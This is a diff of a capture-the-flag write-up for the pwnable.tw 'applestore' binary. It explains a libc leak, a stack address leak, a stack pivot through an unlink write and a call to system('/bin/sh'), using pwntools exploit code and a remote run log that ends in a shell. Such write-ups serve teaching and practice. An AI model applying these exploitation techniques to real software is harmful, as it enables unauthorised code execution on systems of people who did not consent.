@@ -402,7 +402,7 @@ int cart(void)
 
 And as we control gift_slot->name field we can leak puts@libc just by providing got@puts address as name field:
 
-```python3
+```python
 # leak libc_base
 fake_chunk = p32(e.got['puts']) + b'XXXX' + p32(0) + p32(0)
 puts_addr = parse_leaked_addr(remove(i2b(27) + fake_chunk))
@@ -411,7 +411,74 @@ libc_base = puts_addr - libc.symbols['puts']
 log.info('[x] Calculated libc_base from puts_addr:' + hex(libc_base))
 ```
 
-### Leaking stack address
+### Stack pivoting idea
 Now why we can't just overwrite a got address with system function address? This is because unlinking from double linked list do gives us arbitrary write, but it has a side effect! If we want to overwrite address A with address B we would also overwrite address B+12 with address A. And as system function lies in --x segment such write would cause a SIGSEV!
 
-Again it took me a while before I figured out that we can overwrite frame buffer from main function and then two sequential: leave; ret operations (one when leaving handler and second when leaving main) would cause the $esp to point to arbitrary value. This is called stack pivoting. 
+Again it took me a while before I figured out that we can overwrite frame buffer from main function and then two sequential: `leave; ret` operations (one when leaving handler and second when leaving main) would cause the $esp to point to arbitrary value. This is called stack pivoting and would allow us to gain control over $eip!
+
+If you ask yourself if why could just overwrite frame buffer from handler function then the answer is no. Program would perform `leave; ret` sequence when leaving cart and then handler. We would gain stack pivoting but at the same time we would fail on checking the canary.
+
+
+### Leak stack addr
+Ok, but if we want to overwrite stored frame buffer we do need to leak stack address. We learned how to print a value under address of our choice. So we can use this primitive this time as well. We will:
+1) we will overwrite gift_slot name with an address of myCart.next to leak address of a first (after guard) item in cart (this is a heap address)
+2) as we know sizes of slots in a list we will calculate address of next to last slot(the one just before gift_slot).
+3) we will overwrite gift_slot name with an address of the next field of a slot leaked in point 2.
+
+```python
+# Constants found by manual enumeration
+MYCART_ADDR = 0x0804b068
+PREV_TO_FAKE_CHUNK_OFFSET = 1192
+
+# leak fake_chunk_addr and then determinate ra_addr
+fake_chunk = p32(MYCART_ADDR + 8) + b'XXXX' + p32(0) + p32(0)
+prev_to_fake_chunk_addr = parse_leaked_addr(remove(i2b(27) + fake_chunk)) + PREV_TO_FAKE_CHUNK_OFFSET
+log.info(f'[x] Prev to fake chunk addr: {hex(prev_to_fake_chunk_addr)}')
+
+fake_chunk = p32(prev_to_fake_chunk_addr + 8) + b'XXXX' + p32(0) + p32(0)
+fake_chunk_addr = parse_leaked_addr(remove(i2b(27) + fake_chunk))
+log.info(f'[x] Fake chunk addr: {hex(fake_chunk_addr)}')
+```
+
+### Calling system('/bin/sh')
+Now we are left with an easy part. All we have to do is:
+1) overwrite frame buffer (stored $ebp from main function)
+2) place our short rop, in this case system_addr + 'JUNK' + binsh_addr + 0 + 0 using a cmd buff
+3) exit handler to invoke an exploit
+
+```python
+# overwrite ebp_handler, so when program returns from main, we get stack pivoting
+handler_ebp_delete = fake_chunk_addr + HANDLER_EBP_OFFSET
+handler_cmd_buf = fake_chunk_addr + HANDLER_CMD_BUF_OFFSET
+fake_chunk = p32(e.got['puts']) + b'XXXX'  + p32(handler_cmd_buf - 5) + p32(handler_ebp_delete - 8)
+remove(i2b(27) + fake_chunk)
+log.info(f'[x] Overwriten stored ebp, will cause stack pivot when returning from main')
+
+
+# place call to system('/bin/sh') on fake stack
+p.sendline(b'6' + p32(libc_base + libc.symbols['system']) + b'XXXX' + p32(libc_base + BINSH_OFFSET) + p32(0) + p32(0))
+log.info(f'[x] Prepared call to system(\'/bin/sh)')
+
+exit_handler()
+log.info(f'[x] Exited handler and will get shell in a sec')
+```
+
+We have everything. Let's check [our exploit](exp.py):
+
+```bash
+$ python3 exp.py remote
+[+] Opening connection to chall.pwnable.tw on port 10104: Done
+[*] [x] Set total item price in cart to 7174
+[*] [x] Allocated fake chunk
+[*] [x] Leaked puts_addr address: 0xf7633140
+[*] [x] Calculated libc_base from puts_addr: 0xf75d4000
+[*] [x] Prev to fake chunk addr: 0x8b054b8
+[*] [x] Fake chunk addr: 0xffb3b518
+[*] [x] Overwriten stored ebp, will cause stack pivot when returning from main
+[*] [x] Prepared call to system('/bin/sh)
+[*] [x] Exited handler and will get shell in a sec
+[*] Switching to interactive mode
+Times Up!
+$ id
+uid=1000(applestore) gid=1000(applestore) groups=1000(applestore)
+```
